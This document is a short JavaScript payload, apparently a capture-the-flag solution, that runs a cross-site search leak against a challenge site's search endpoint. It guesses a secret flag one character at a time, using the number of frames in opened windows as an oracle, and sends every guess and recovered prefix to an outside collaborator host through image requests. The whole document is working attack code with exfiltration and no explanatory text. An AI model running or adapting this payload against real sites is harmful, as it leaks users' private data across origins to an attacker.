<script>
const BASE = "https://wonder.cbd2026.cloud";
const EXFIL = "https://njacv1ltv98lg8jybtbpgareu50wosch.oastify.com";

const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!@#$%^&*().,:;";
let flag = "CBC{";

function leak(s) {
  new Image().src = EXFIL + "/?f=" + encodeURIComponent(s) + "&t=" + Date.now();
}

async function test(prefix) {
  let w = open(BASE + "/search?q=" + encodeURIComponent(prefix), "_blank");
  await new Promise(r => setTimeout(r, 2500));

  let ok = false;
  try {
    ok = w.length > 0;
  } catch(e) {}

  try { w.close(); } catch(e) {}
  return ok;
}

async function run() {
  leak("START");

  while (true) {
    let found = false;

    for (let c of charset) {
      let guess = flag + c;
      leak("TRY:" + guess);

      if (await test(guess)) {
        flag += c;
        leak(flag);
        found = true;

        if (c === "}") return;
        break;
      }
    }

    if (!found) {
      leak("STUCK:" + flag);
      return;
    }
  }
}

run();
</script>
